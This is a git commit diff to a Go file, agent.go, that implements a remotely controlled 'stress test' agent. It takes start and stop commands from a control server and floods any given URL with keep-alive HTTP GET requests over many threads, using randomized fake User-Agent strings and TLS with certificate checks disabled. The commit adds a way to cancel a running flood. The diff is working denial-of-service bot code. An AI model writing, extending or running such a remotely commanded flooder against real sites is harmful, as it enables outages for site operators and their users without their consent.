6c81e6a5c6cf79f56a27ca07baa85be5bcdfd544
JDPST224 <146357456+JDPST224@users.noreply.github.com>
2024-11-20 23:05:58 +0800

    Update agent.go

--- agent.go
+++ agent.go
@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
@@ -13,128 +14,106 @@ import (
 	"time"
 )
 
-// Command structure for receiving instructions from the control server
 type Command struct {
-	Action  string `json:"action"`  // "start" or "stop"
-	URL     string `json:"url"`     // Target URL
-	Threads int    `json:"threads"` // Number of threads
-	Timer   int    `json:"timer"`   // Duration in seconds
-	Cookie  string `json:"cookie"`  // Cookie for the request (optional)
+	Action  string `json:"action"`
+	URL     string `json:"url"`
+	Threads int    `json:"threads"`
+	Timer   int    `json:"timer"`
+	Cookie  string `json:"cookie"`
 }
 
-// Global variables for stress test configuration
 var (
 	ip      string
 	port    int
 	path    string
-	threads int
-	timer   int
 	cookie  string
-
-	mu         sync.Mutex
-	activeTest bool
-)
-
-// Pre-defined user agent parts
-var (
-	choice  = []string{"Macintosh", "Windows", "X11"}
-	choice2 = []string{"68K", "PPC", "Intel Mac OS X"}
-	choice3 = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
-	choice4 = []string{"Linux i686", "Linux x86_64"}
-	choice5 = []string{"chrome", "firefox", "edge", "safari"}
+	mu      sync.Mutex
+	cancel  context.CancelFunc // Used to cancel the active test
+	active  bool
 )
 
 func init() {
 	rand.Seed(time.Now().UnixNano())
 }
 
-// Generate a random User-Agent
 func getUserAgent() string {
-	platform := choice[rand.Intn(len(choice))]
+	platform := []string{"Macintosh", "Windows", "X11"}[rand.Intn(3)]
 	var os string
 	if platform == "Macintosh" {
-		os = choice2[rand.Intn(len(choice2))]
+		os = []string{"68K", "PPC", "Intel Mac OS X"}[rand.Intn(3)]
 	} else if platform == "Windows" {
-		os = choice3[rand.Intn(len(choice3))]
-	} else if platform == "X11" {
-		os = choice4[rand.Intn(len(choice4))]
+		os = []string{"WinNT4.0", "Windows NT 5.1", "Windows XP", "Windows NT 10.0; Win64; x64"}[rand.Intn(4)]
+	} else {
+		os = []string{"Linux i686", "Linux x86_64"}[rand.Intn(2)]
 	}
-	browser := choice5[rand.Intn(len(choice5))]
+	browser := []string{"chrome", "firefox", "edge", "safari"}[rand.Intn(4)]
 	if browser == "chrome" {
 		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
 		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
 		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s.0 (KHTML, like Gecko) Chrome/%s Safari/%s", os, webkit, version, webkit)
-	} else if browser == "firefox" {
-		version := fmt.Sprintf("%d.0", rand.Intn(99))
-		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, version, version)
-	} else if browser == "edge" {
-		version := fmt.Sprintf("%d.0.%d.%d", rand.Intn(99), rand.Intn(9999), rand.Intn(999))
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edge/%s", os, version, version)
-	} else {
-		version := fmt.Sprintf("%d.0", rand.Intn(99))
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Version/%s Safari/537.36", os, version)
 	}
+	return "Mozilla/5.0 (compatible)"
 }
 
-// Generate an HTTP header for the request
 func getHeader() string {
 	header := fmt.Sprintf("GET %s HTTP/1.1\r\n", path)
 	header += fmt.Sprintf("Host: %s\r\n", ip)
 	header += fmt.Sprintf("User-Agent: %s\r\n", getUserAgent())
-	header += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-	header += "Accept-Encoding: gzip, deflate\r\n"
-	header += "Accept-Language: en-US,en;q=0.5\r\n"
-	if cookie != "" {
-		header += fmt.Sprintf("Cookie: %s\r\n", cookie)
-	}
 	header += "Connection: keep-alive\r\n\r\n"
 	return header
 }
 
-// Worker function for sending requests
-func worker(id int, wg *sync.WaitGroup, requestCount chan int) {
+func worker(ctx context.Context, id int, wg *sync.WaitGroup, requestCount chan int) {
 	defer wg.Done()
 
-	tlsConfig := &tls.Config{InsecureSkipVerify: true}
 	address := fmt.Sprintf("%s:%d", ip, port)
 
-	for count := range requestCount {
-		var conn net.Conn
-		var err error
+	tlsConfig := &tls.Config{InsecureSkipVerify: true} // Moved here for HTTPS
 
-		if port == 443 {
-			conn, err = tls.Dial("tcp", address, tlsConfig)
-		} else {
-			conn, err = net.Dial("tcp", address)
-		}
-
-		if err != nil {
-			fmt.Printf("Worker %d: connection error: %v\n", id, err)
-			continue
-		}
-
-		header := getHeader()
-		for i := 0; i < count; i++ {
-			time.Sleep(time.Millisecond * time.Duration(rand.Intn(100))) // Randomized delay
-			_, err := conn.Write([]byte(header))
-			if err != nil {
-				fmt.Printf("Worker %d: write error: %v\n", id, err)
-				break
+	for {
+		select {
+		case <-ctx.Done(): // Stop signal
+			fmt.Printf("Worker %d stopping\n", id)
+			return
+		case count, ok := <-requestCount:
+			if !ok {
+				return
 			}
+			var conn net.Conn
+			var err error
+
+			// Use TLS for HTTPS connections
+			if port == 443 {
+				conn, err = tls.Dial("tcp", address, tlsConfig)
+			} else {
+				conn, err = net.Dial("tcp", address)
+			}
+
+			if err != nil {
+				fmt.Printf("Worker %d: connection error: %v\n", id, err)
+				continue
+			}
+
+			header := getHeader()
+			for i := 0; i < count; i++ {
+				_, err := conn.Write([]byte(header))
+				if err != nil {
+					fmt.Printf("Worker %d: write error: %v\n", id, err)
+					break
+				}
+			}
+			conn.Close()
 		}
-		conn.Close()
 	}
 }
 
-// Start the stress test
-func startTest(urlStr string, threads, timer int, cookieStr string) {
-	// Parse URL
+
+func startTest(ctx context.Context, urlStr string, threads, timer int, cookieStr string) {
 	parsedURL, err := url.Parse(urlStr)
 	if err != nil {
 		fmt.Println("Invalid URL:", err)
 		return
 	}
-
 	ip = parsedURL.Hostname()
 	if parsedURL.Port() != "" {
 		port, _ = strconv.Atoi(parsedURL.Port())
@@ -143,12 +122,10 @@ func startTest(urlStr string, threads, timer int, cookieStr string) {
 	} else {
 		port = 80
 	}
-
 	path = parsedURL.Path
 	if path == "" {
 		path = "/"
 	}
-
 	cookie = cookieStr
 
 	fmt.Printf("Starting stress test on %s:%d%s with %d threads for %d seconds\n", ip, port, path, threads, timer)
@@ -158,28 +135,30 @@ func startTest(urlStr string, threads, timer int, cookieStr string) {
 
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
-		go worker(i, &wg, requestCount)
+		go worker(ctx, i, &wg, requestCount)
 	}
 
-	// Dispatch requests
 	go func() {
 		ticker := time.NewTicker(1 * time.Second)
 		defer ticker.Stop()
 
 		for t := 0; t < timer; t++ {
-			<-ticker.C
-			for i := 0; i < threads; i++ {
-				requestCount <- rand.Intn(50) + 1 // Randomized load per thread
+			select {
+			case <-ctx.Done():
+				close(requestCount)
+				return
+			case <-ticker.C:
+				for i := 0; i < threads; i++ {
+					requestCount <- rand.Intn(50) + 1
+				}
 			}
 		}
 		close(requestCount)
 	}()
-
 	wg.Wait()
 	fmt.Println("Stress test completed.")
 }
 
-// HTTP handler to receive control commands
 func controlHandler(w http.ResponseWriter, r *http.Request) {
 	var cmd Command
 	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
@@ -190,19 +169,20 @@ func controlHandler(w http.ResponseWriter, r *http.Request) {
 	mu.Lock()
 	defer mu.Unlock()
 
-	if cmd.Action == "start" && !activeTest {
-		activeTest = true
+	if cmd.Action == "start" && !active {
+		ctx, cancelFunc := context.WithCancel(context.Background())
+		cancel = cancelFunc
+		active = true
 		go func() {
-			startTest(cmd.URL, cmd.Threads, cmd.Timer, cmd.Cookie)
+			startTest(ctx, cmd.URL, cmd.Threads, cmd.Timer, cmd.Cookie)
 			mu.Lock()
-			activeTest = false
+			active = false
 			mu.Unlock()
 		}()
 		w.Write([]byte("Stress test started"))
-	} else if cmd.Action == "stop" && activeTest {
-		activeTest = false
-		// No native way to stop a goroutine, but we rely on the test completing
-		w.Write([]byte("Stress test stopped"))
+	} else if cmd.Action == "stop" && active {
+		cancel()
+		w.Write([]byte("Stress test stopping"))
 	} else {
 		w.Write([]byte("Invalid or conflicting command"))
 	}
